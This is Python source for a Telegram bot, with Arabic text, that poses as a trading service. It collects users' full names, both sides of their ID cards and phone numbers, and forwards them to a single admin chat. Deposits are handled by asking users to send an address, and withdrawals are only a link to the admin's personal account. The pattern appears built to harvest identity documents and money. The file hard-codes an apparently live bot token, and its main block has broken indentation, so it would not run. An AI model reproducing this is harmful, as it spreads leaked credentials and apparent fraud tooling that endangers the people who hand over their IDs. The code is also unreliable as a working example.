import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# سيرفر وهمي لإرضاء Render في الخطة المجانية
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running!")

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    server.serve_forever()

# تشغيل السيرفر في الخلفية
threading.Thread(target=run_dummy_server, daemon=True).start()
import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, 
    CallbackQueryHandler, ConversationHandler, filters, ContextTypes
)

# ----------------- ضع بياناتك هنا -----------------
TOKEN = "8888249024:AAGmIda-57nIOS5t7YnqJ48NAqJKe4VVpbY"
MY_CHAT_ID = "8994512911"
MY_USERNAME = "Trade11maneger"      # اسم مستخدم تلغرام الخاص بك (بدون @)
# --------------------------------------------------

# حالات خطة التسجيل
NAME, ID_PHOTOS, PHONE = range(3)

# لوحة الأزرار الرئيسية
def main_menu_keyboard():
    keyboard = [
        ["القائمة الرئيسية"],
        ["1. إنشاء حساب"],
        ["2. السحب والإيداع", "3. خدمة العملاء"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
# أزرار السحب والإيداع
def deposit_withdraw_keyboard():
    keyboard = [
        [InlineKeyboardButton("سحب", url=f"https://t.me/{MY_USERNAME}")],
        [InlineKeyboardButton("إيداع", callback_data="deposit")]
    ]
    return InlineKeyboardMarkup(keyboard)

# أمر البداية /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "أهلاً بك! الرجاء اختيار إحدى الخدمات من القائمة:",
        reply_markup=main_menu_keyboard()
    )

# ----------------- 1. مسار إنشاء حساب -----------------
async def start_register(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['id_photos'] = []
    await update.message.reply_text(
        "يرجى إدخال الاسم الثلاثي:",
        reply_markup=ReplyKeyboardRemove()
    )
    return NAME

async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['full_name'] = update.message.text
    await update.message.reply_text("الرجاء إرسال صور الهوية (الأمامي والخلفي):")
    return ID_PHOTOS

async def get_id_photos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    photo_file = update.message.photo[-1].file_id
    context.user_data['id_photos'].append(photo_file)
    
    if len(context.user_data['id_photos']) < 2:
        await update.message.reply_text("تم استلام الصورة الأولى، الرجاء إرسال صورة الوجه الآخر للهوية:")
        return ID_PHOTOS
    
    await update.message.reply_text("تم استلام صور الهوية. الآن يرجى إرسال رقم الهاتف:")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_phone = update.message.text
    user = update.effective_user
    full_name = context.user_data.get('full_name')
    photos = context.user_data.get('id_photos', [])

    # إرسال البيانات إليك (الآدمن)
    await context.bot.send_message(
        chat_id=MY_CHAT_ID,
        text=f"📥 **طلب إنشاء حساب جديد**:\n\n"
             f"👤 المستخدم: @{user.username} (ID: {user.id})\n"
             f"📝 الاسم الثلاثي: {full_name}\n"
             f"📞 رقم الهاتف: {user_phone}"
    )
    for p_id in photos:
        await context.bot.send_photo(chat_id=MY_CHAT_ID, photo=p_id)

    await update.message.reply_text(
        "تم استلام كافة بياناتك بنجاح، سيتم مراجعة الحساب وتأكيده قريباً.",
        reply_markup=main_menu_keyboard()
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("تم إلغاء العملية.", reply_markup=main_menu_keyboard())
    return ConversationHandler.END

# ----------------- 2. مسار السحب والإيداع -----------------
async def withdraw_deposit_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "اختر العملية المطلوبة:",
        reply_markup=deposit_withdraw_keyboard()
    )

async def handle_deposit_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['waiting_for_deposit'] = True
    await query.edit_message_text("أرسل عنوانك الخاص (سواءً كان نصاً أو صورة للعنوان):")

async def handle_deposit_submission(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('waiting_for_deposit'):
        user = update.effective_user
        
        await update.message.reply_text("تم تحويل طلب الإيداع للقسم المختص.", reply_markup=main_menu_keyboard())
        
        # تحويل العنوان/الصورة إليك
        await context.bot.send_message(
            chat_id=MY_CHAT_ID,
            text=f"💰 **طلب إيداع جديد**\nمن المستخدم: @{user.username}\nنص الرسالة: \"اريد ان اضع اموال\""
        )
        
        if update.message.photo:
            await context.bot.send_photo(chat_id=MY_CHAT_ID, photo=update.message.photo[-1].file_id)
        elif update.message.text:
            await context.bot.send_message(chat_id=MY_CHAT_ID, text=f"العنوان المرسل:\n{update.message.text}")
            
        context.user_data['waiting_for_deposit'] = False

# ----------------- 3. مسار خدمة العملاء -----------------
async def customer_service(update: Update, context: ContextTypes.DEFAULT_TYPE):
    support_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("التواصل مع الدعم", url=f"https://t.me/{MY_USERNAME}")]
    ])
    await update.message.reply_text("للتحويل المباشر إلى خدمة العملاء اضغط على الزر أدناه:", reply_markup=support_keyboard)
async def main_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("WELCOME", reply_markup=main_menu_keyboard())
# ----------------- التشغيل الرئيسي -----------------
if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()

conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('إنشاء حساب'), start_register)],
        states={
            NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)],
            ID_PHOTOS: [MessageHandler(filters.PHOTO, get_id_photos)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    app.add_handler(CommandHandler('start', start))
    app.add_handler(conv_handler)
   app.add_handler(MessageHandler(filters.Regex('السحب والإيداع'), withdraw_deposit_menu))
   app.add_handler(MessageHandler(filters.Regex('خدمة العملاء'), customer_service))
    app.add_handler(MessageHandler(filters.Regex('القائمة الرئيسية'), main_menu_handler))
  app.add_handler(MessageHandler((filters.TEXT | filters.PHOTO) & ~filters.COMMAND, handle_deposit_submission))

    print("البوت يعمل الآن...")
    app.run_polling()
